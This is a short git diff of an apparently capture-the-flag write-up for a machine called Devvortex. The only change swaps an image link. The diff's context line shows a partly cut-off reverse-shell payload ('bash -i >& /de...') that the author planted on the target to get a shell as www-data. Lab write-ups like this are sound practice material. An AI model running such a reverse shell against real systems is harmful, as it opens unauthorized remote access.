@@ -93,7 +93,7 @@ Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /de
 
 I save the file, and back on my system, I get a connection and I now have access onto the devvortex server itself:
 
-![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/e03da5be-3d6a-4c5e-9434-445e56574380)
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/a2d3cf3b-928f-4ed9-a42e-b54ab5626158)
 
 # Shell as www-data
 
